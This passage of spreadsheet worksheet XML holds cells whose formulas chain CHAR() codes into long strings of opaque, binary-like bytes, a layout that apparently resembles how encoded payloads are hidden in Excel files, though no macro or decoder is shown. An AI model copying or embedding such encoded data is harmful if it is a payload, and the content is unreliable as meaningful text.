        <f>CHAR(3)&amp;CHAR(67)&amp;CHAR(238)&amp;CHAR(86)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(116)&amp;CHAR(23)&amp;CHAR(142)&amp;CHAR(77)&amp;CHAR(8)&amp;CHAR(128)&amp;CHAR(207)&amp;CHAR(126)&amp;CHAR(10)&amp;CHAR(128)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(253)&amp;CHAR(93)&amp;CHAR(9)&amp;CHAR(141)&amp;CHAR(119)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(12)&amp;CHAR(128)&amp;CHAR(194)&amp;CHAR(114)&amp;CHAR(24)&amp;CHAR(128)&amp;CHAR(20)&amp;CHAR(80)&amp;CHAR(253)&amp;CHAR(89)&amp;CHAR(43)&amp;CHAR(141)&amp;CHAR(75)&amp;CHAR(27)&amp;CHAR(81)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(245)&amp;CHAR(83)&amp;CHAR(10)&amp;CHAR(140)&amp;CHAR(125)&amp;CHAR(13)&amp;CHAR(138)&amp;CHAR(79)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(113)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(10)&amp;CHAR(90)&amp;CHAR(254)&amp;CHAR(93)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(125)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(11)&amp;CHAR(131)&amp;CHAR(203)&amp;CHAR(113)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(8)&amp;CHAR(91)&amp;CHAR(253)&amp;CHAR(84)&amp;CHAR(10)&amp;CHAR(155)&amp;CHAR(47)&amp;CHAR(89)&amp;CHAR(92)&amp;CHAR(196)&amp;CHAR(129)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(7)&amp;CHAR(135)&amp;CHAR(197)&amp;CHAR(22)&amp;CHAR(250)&amp;CHAR(252)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(6)&amp;CHAR(192)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(188)&amp;CHAR(8)&amp;CHAR(74)&amp;CHAR(5)&amp;CHAR(148)&amp;CHAR(198)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(190)&amp;CHAR(11)&amp;CHAR(75)&amp;CHAR(21)&amp;CHAR(129)&amp;CHAR(192)&amp;CHAR(25)&amp;CHAR(7)&amp;CHAR(190)&amp;CHAR(12)&amp;CHAR(83)&amp;CHAR(1)&amp;CHAR(133)&amp;CHAR(192)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(1)&amp;CHAR(254)&amp;CHAR(117)&amp;CHAR(38)&amp;CHAR(27)&amp;CHAR(252)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(17)&amp;CHAR(128)&amp;CHAR(75)&amp;CHAR(9)&amp;CHAR(242)&amp;CHAR(113)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(86)&amp;CHAR(135)&amp;CHAR(13)&amp;CHAR(249)&amp;CHAR(83)&amp;CHAR(45)&amp;CHAR(199)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(178)&amp;CHAR(3)&amp;CHAR(68)&amp;CHAR(2)&amp;CHAR(146)&amp;CHAR(211)&amp;CHAR(18)&amp;CHAR(2)&amp;CHAR(80)&amp;CHAR(129)&amp;CHAR(123)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(129)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(13)&amp;CHAR(187)&amp;CHAR(8)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(230)&amp;CHAR(23)&amp;CHAR(82)&amp;CHAR(130)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(24)&amp;CHAR(143)&amp;CHAR(67)&amp;CHAR(3)&amp;CHAR(86)&amp;CHAR(129)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(80)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(14)&amp;CHAR(132)&amp;CHAR(20)&amp;CHAR(50)&amp;CHAR(197)&amp;CHAR(92)&amp;CHAR(85)&amp;CHAR(192)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(9)&amp;CHAR(135)&amp;CHAR(195)&amp;CHAR(118)&amp;CHAR(2)&amp;CHAR(181)&amp;CHAR(6)&amp;CHAR(75)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(230)&amp;CHAR(13)&amp;CHAR(194)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(49)&amp;CHAR(197)&amp;CHAR(199)&amp;CHAR(13)&amp;CHAR(9)&amp;CHAR(95)&amp;CHAR(137)&amp;CHAR(232)&amp;CHAR(253)&amp;CHAR(103)&amp;CHAR(57)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(15)&amp;CHAR(245)&amp;CHAR(114)&amp;CHAR(33)&amp;CHAR(252)&amp;CHAR(113)&amp;CHAR(37)&amp;CHAR(141)&amp;CHAR(66)&amp;CHAR(11)&amp;CHAR(244)&amp;CHAR(127)&amp;CHAR(26)&amp;CHAR(253)&amp;CHAR(120)&amp;CHAR(25)&amp;CHAR(143)&amp;CHAR(24)&amp;CHAR(245)&amp;CHAR(112)&amp;CHAR(24)&amp;CHAR(84)</f>
        <v>_x0003_CîV
Žt_x0017_ŽM_x0008_€Ï~
€_x000B_Wý]	w_x0006_ŽZ_x000C_€Âr_x0018_€_x0014_PýY+K_x001B_QŽ
õS
Œ}_x000D_ŠO_x0006_†Êq_x0004_Ž
Zþ]_x000D_Œ}_x0002_‡_x000B_ƒËq_x000D_Ž_x0008_[ýT
›/Y\ÄC!_x0007_‡Å_x0016_úü_x000B__x0006_À	_x0001_¼_x0008_J_x0005_”Æ	_x000B_¾_x000B_K_x0015_À_x0019__x0007_¾_x000C_S_x0001_…À_x0002__x0002_‰A'_x0001_þu&amp;_x001B_üq)_x0011_€K	òq!_x0017_V‡_x000D_ùS-Ç_x001D_	²_x0003_D_x0002_’Ó_x0012__x0002_P{!_x0017_ús_x000D_»_x0008_J_x0006_‚æ_x0017_R‚~!_x0018_C_x0003_V_x0003_êP_x0006_‚A_x000E_„_x0014_2Å\UÀ_x0012__x0005_ˆA%	‡Ãv_x0002_µ_x0006_K_x000B_æ_x000D_Â_x0003__x0007__x000C__x0005__x0006_1ÅÇ_x000D_	_‰èýg9G_x000F_õr!üq%B_x000B_ô_x001A_ýx_x0019__x0018_õp_x0018_T</v>
      </c>
      <c r="C102" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(175)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)</f>
        <v>÷ýôS…`¯Îßý</v>
      </c>
    </row>
    <row r="103" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B103" t="str">
        <f>CHAR(84)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(38)&amp;CHAR(86)&amp;CHAR(215)&amp;CHAR(37)&amp;CHAR(2)&amp;CHAR(90)&amp;CHAR(81)&amp;CHAR(81)&amp;CHAR(229)&amp;CHAR(81)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(186)&amp;CHAR(22)&amp;CHAR(31)&amp;CHAR(65)&amp;CHAR(2)&amp;CHAR(188)&amp;CHAR(231)&amp;CHAR(47)&amp;CHAR(77)&amp;CHAR(5)&amp;CHAR(32)&amp;CHAR(196)&amp;CHAR(2)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(14)&amp;CHAR(228)&amp;CHAR(34)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(224)&amp;CHAR(19)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(3)&amp;CHAR(237)&amp;CHAR(23)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(159)&amp;CHAR(21)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(12)&amp;CHAR(237)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(91)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(14)&amp;CHAR(237)&amp;CHAR(237)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(51)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(22)&amp;CHAR(228)&amp;CHAR(222)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(9)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(19)&amp;CHAR(237)&amp;CHAR(203)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(119)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(28)&amp;CHAR(237)&amp;CHAR(190)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(112)&amp;CHAR(16)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(30)&amp;CHAR(237)&amp;CHAR(161)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(38)&amp;CHAR(228)&amp;CHAR(138)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(35)&amp;CHAR(237)&amp;CHAR(127)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(44)&amp;CHAR(237)&amp;CHAR(98)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(46)&amp;CHAR(237)&amp;CHAR(85)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)</f>
        <v>TôT&amp;V×%_x0002_ZQQåQ_x000E__x0005__x0002_v&amp;_x0011_º_x0016__x001F_A_x0002_¼ç/M_x0005_ Ä_x0002_ÅŽ_x0003_Š_x000E_ä"	_x0002__x0005_¼à_x0013_J_x0002_/Í_x0011_Ù_x0004_ŽB_x0003_í_x0017__x000B__x0005__x0006_³Ÿ_x0015_J_x0006_)Â_x0002_Ì‚_x000C_Œ\_x000C_í
_x000B_¬[_x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJ_x000E_íí_x000B__x0001__x0001_»3_x0018_E_x000D_.Ä_x0008_É†_x0003_ŒK_x0016_äÞ_x0008__x0002__x0005_¼	_x0012_J_x0002_/Í_x0011_Ù_x0004_ŽB_x0013_íË
_x0005__x0006_³w_x0010_J_x0006_)Â_x0002_Ì‚_x000C_Œ\_x001C_í¾_x0008_
_x000B_¬p_x0010_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJ_x001E_í¡_x000B__x0001__x0001_»_x0007__x0018_E_x000D_.Ä_x0008_É†_x0003_ŒK&amp;äŠ_x0008__x0002__x0005_¼_x0001__x0012_J_x0002_/Í_x0011_Ù_x0004_ŽB#í
_x0005__x0006_³_x0007__x0010_J_x0006_)Â_x0002_Ì‚_x000C_Œ\,íb_x0008_
_x000B_¬_x0005__x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJ.íU_x000B__x0001__x0001_»_x0007__x0018_</v>
      </c>
      <c r="C103" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(106)&amp;CHAR(121)&amp;CHAR(99)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)</f>
        <v>ô6…jyc÷ýô~</v>
      </c>
    </row>
    <row r="104" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B104" t="str">
        <f>CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(54)&amp;CHAR(228)&amp;CHAR(70)&amp;CHAR(8)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(129)&amp;CHAR(23)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(51)&amp;CHAR(237)&amp;CHAR(51)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(60)&amp;CHAR(237)&amp;CHAR(22)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(62)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(70)&amp;CHAR(228)&amp;CHAR(242)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(67)&amp;CHAR(237)&amp;CHAR(231)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(76)&amp;CHAR(237)&amp;CHAR(218)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(78)&amp;CHAR(237)&amp;CHAR(189)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(86)&amp;CHAR(228)&amp;CHAR(174)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(249)&amp;CHAR(19)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(66)&amp;CHAR(83)&amp;CHAR(237)&amp;CHAR(155)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(16)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(92)&amp;CHAR(237)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(41)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(94)&amp;CHAR(237)&amp;CHAR(113)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(102)&amp;CHAR(228)&amp;CHAR(90)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(169)&amp;CHAR(23)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(47)&amp;CHAR(205)&amp;CHAR(17)&amp;CHAR(217)&amp;CHAR(141)&amp;CHAR(4)</f>
        <v>E_x000D_.Ä_x0008_É†_x0003_ŒK6äF_x0008__x0002__x0005_¼_x0017_J_x0002_/Í_x0011_Ù_x0004_ŽB3í3
_x0005__x0006_³_x0007__x0010_J_x0006_)Â_x0002_Ì‚_x000C_Œ\&lt;í_x0016__x0008_
_x000B_¬_x0005__x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJ&gt;í	_x000B__x0001__x0001_»_x0007__x0018_E_x000D_.Ä_x0008_É†_x0003_ŒKFäò_x000B__x0002__x0005_¼_x0001__x0012_J_x0002_/Í_x0011_Ù_x0004_ŽBCíç	_x0005__x0006_³_x0007__x0010_J_x0006_)Â_x0002_Ì‚_x000C_Œ\LíÚ_x000B_
_x000B_¬_x0005__x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJNí½_x0008__x0001__x0001_»_x0007__x0018_E_x000D_.Ä_x0008_É†_x0003_ŒKVä®_x000B__x0002__x0005_¼ù_x0013_J_x0002_/Í_x0011_Ù_x0004_ŽBSí›	_x0005__x0006_³_x0007__x0010_J_x0006_)Â_x0002_Ì‚_x000C_Œ\\íŽ_x000B_
_x000B_¬)_x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJ^íq_x0008__x0001__x0001_»_x0007__x0018_E_x000D_.Ä_x0008_É†_x0003_ŒKfäZ_x000B__x0002__x0005_¼©_x0017_J_x0002_/Í_x0011_Ù_x0004_</v>
      </c>
      <c r="C104" t="str">
        <f>CHAR(70)&amp;CHAR(249)&amp;CHAR(222)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(241)&amp;CHAR(209)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>FùÞ£|ñÑ_x001E_Íë</v>
      </c>
    </row>
    <row r="105" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B105" t="str">
        <f>CHAR(142)&amp;CHAR(66)&amp;CHAR(99)&amp;CHAR(237)&amp;CHAR(79)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(179)&amp;CHAR(247)&amp;CHAR(17)&amp;CHAR(74)&amp;CHAR(6)&amp;CHAR(41)&amp;CHAR(194)&amp;CHAR(2)&amp;CHAR(204)&amp;CHAR(130)&amp;CHAR(12)&amp;CHAR(140)&amp;CHAR(92)&amp;CHAR(108)&amp;CHAR(237)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(11)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(25)&amp;CHAR(73)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(16)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(74)&amp;CHAR(110)&amp;CHAR(237)&amp;CHAR(37)&amp;CHAR(8)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(187)&amp;CHAR(7)&amp;CHAR(24)&amp;CHAR(69)&amp;CHAR(13)&amp;CHAR(46)&amp;CHAR(196)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(3)&amp;CHAR(140)&amp;CHAR(75)&amp;CHAR(118)&amp;CHAR(228)&amp;CHAR(22)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(188)&amp;CHAR(1)&amp;CHAR(18)&amp;CHAR(74)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(92)&amp;CHAR(22)&amp;CHAR(58)&amp;CHAR(201)&amp;CHAR(137)&amp;CHAR(123)&amp;CHAR(46)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(143)&amp;CHAR(3)&amp;CHAR(85)&amp;CHAR(131)&amp;CHAR(75)&amp;CHAR(127)&amp;CHAR(135)&amp;CHAR(129)&amp;CHAR(222)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(108)&amp;CHAR(21)&amp;CHAR(20)&amp;CHAR(84)&amp;CHAR(140)&amp;CHAR(117)&amp;CHAR(18)&amp;CHAR(245)&amp;CHAR(92)&amp;CHAR(109)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(124)&amp;CHAR(20)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(158)&amp;CHAR(71)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(135)&amp;CHAR(133)&amp;CHAR(142)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(19)&amp;CHAR(82)&amp;CHAR(252)&amp;CHAR(87)&amp;CHAR(21)&amp;CHAR(90)&amp;CHAR(85)&amp;CHAR(80)&amp;CHAR(194)&amp;CHAR(134)&amp;CHAR(81)&amp;CHAR(33)&amp;CHAR(15)&amp;CHAR(131)&amp;CHAR(222)&amp;CHAR(112)&amp;CHAR(1)&amp;CHAR(186)&amp;CHAR(6)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(225)&amp;CHAR(93)&amp;CHAR(87)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(53)&amp;CHAR(10)&amp;CHAR(49)&amp;CHAR(206)&amp;CHAR(92)&amp;CHAR(140)&amp;CHAR(113)&amp;CHAR(39)&amp;CHAR(8)&amp;CHAR(82)&amp;CHAR(141)&amp;CHAR(116)&amp;CHAR(23)&amp;CHAR(128)&amp;CHAR(142)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(14)&amp;CHAR(1)&amp;CHAR(4)&amp;CHAR(50)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(97)&amp;CHAR(12)&amp;CHAR(68)&amp;CHAR(136)&amp;CHAR(255)&amp;CHAR(14)&amp;CHAR(126)&amp;CHAR(251)&amp;CHAR(234)&amp;CHAR(40)&amp;CHAR(58)&amp;CHAR(206)&amp;CHAR(141)&amp;CHAR(137)&amp;CHAR(156)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(6)&amp;CHAR(142)&amp;CHAR(118)&amp;CHAR(13)&amp;CHAR(64)&amp;CHAR(130)&amp;CHAR(251)&amp;CHAR(7)&amp;CHAR(118)&amp;CHAR(235)&amp;CHAR(230)&amp;CHAR(17)&amp;CHAR(56)&amp;CHAR(194)&amp;CHAR(138)&amp;CHAR(137)&amp;CHAR(138)&amp;CHAR(137)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(62)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(112)&amp;CHAR(9)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(243)&amp;CHAR(6)&amp;CHAR(113)&amp;CHAR(236)&amp;CHAR(155)&amp;CHAR(35)&amp;CHAR(53)&amp;CHAR(194)&amp;CHAR(236)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(39)&amp;CHAR(3)&amp;CHAR(188)&amp;CHAR(7)&amp;CHAR(70)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(84)&amp;CHAR(84)&amp;CHAR(93)&amp;CHAR(192)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(143)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(1)&amp;CHAR(126)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(11)&amp;CHAR(108)&amp;CHAR(247)&amp;CHAR(128)</f>
        <v>ŽBcíO	_x0005__x0006_³÷_x0011_J_x0006_)Â_x0002_Ì‚_x000C_Œ\lí2_x000B_
_x000B_¬_x0005__x0019_I_x0007_-Â_x0010_ÉŽ_x0004_ƒJní%_x0008__x0001__x0001_»_x0007__x0018_E_x000D_.Ä_x0008_É†_x0003_ŒKvä_x0016__x000B__x0002__x0005_¼_x0001__x0012_J_x0002_‰\_x0016_:É‰{._x0017__x0006_Ë_x0003_UƒK‡Þ_x000E__x0001__x0004_Šl_x0015__x0014_TŒu_x0012_õ\m„Â|_x0014__x0006_žG_x000D_R‡…Ž_x0001__x0003__x0005_QŠ_x0013_RüW_x0015_ZUPÂ†Q!_x000F_ƒÞp_x0001_º_x0006_E_x0005_‰á]W‰N5
1Î\Œq'_x0008_Rt_x0017_€Ž‰þ_x000E__x0001__x0004_2_x000E_Ža_x000C_Dˆÿ_x000E_~ûê(:Î‰œ_x000D__x0001__x0002_
9_x0006_Žv_x000D_@‚û_x0007_vëæ_x0011_8ÂŠ‰Š‰_x0007__x0006__x000C_&gt;_x0002_‰p	DŠó_x0006_qì›#5Âì_x0002_„'_x0003_¼_x0007_F
ƒTT]À_x0001__x0001_M._x0001_~_x0004_o_x000B_l÷€</v>
      </c>
      <c r="C105" t="str">
        <f>CHAR(187)&amp;CHAR(163)&amp;CHAR(116)&amp;CHAR(60)&amp;CHAR(140)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(123)</f>
        <v>»£t&lt;Œ~FâD{</v>
      </c>
    </row>
    <row r="106" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B106" t="str">
